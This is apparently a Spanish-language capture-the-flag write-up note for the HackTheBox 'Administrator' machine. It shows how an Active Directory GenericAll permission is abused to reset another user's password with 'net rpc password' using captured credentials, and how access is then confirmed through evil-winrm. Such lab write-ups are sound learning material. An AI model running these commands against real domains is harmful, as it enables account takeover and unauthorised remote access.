#GenericAll

---
Si le hago click derecho a la linea y pongo help
![[Administrator25.png]]
Con el permiso [[GenericAll]] podemos cambiar la contraseña del usuario *Michael* y nos da el comando
![[Administrator26.png]]
Usamos `net rpc password "michael" "pawned" -U "administrator.htb"/"Olivia"%"ichliebedich" -S "10.129.112.214"` y nos da que la contraseña no se puede cambiar por que no cumple los requerimientos, asi que probamos `net rpc password "michael" "pawned123" -U "administrator.htb"/"Olivia"%"ichliebedich" -S "10.129.112.214"`. En teoria se cambio con exito

![[Administrator27.png]]
Pero para probar si las credenciales son validas use [[evil-winrm]] con `evil-winrm -u michael -p pawned123 -i10.129.112.214` y como nos conecto ya sabemos que todo es correcto
![[Administrator28.png]]
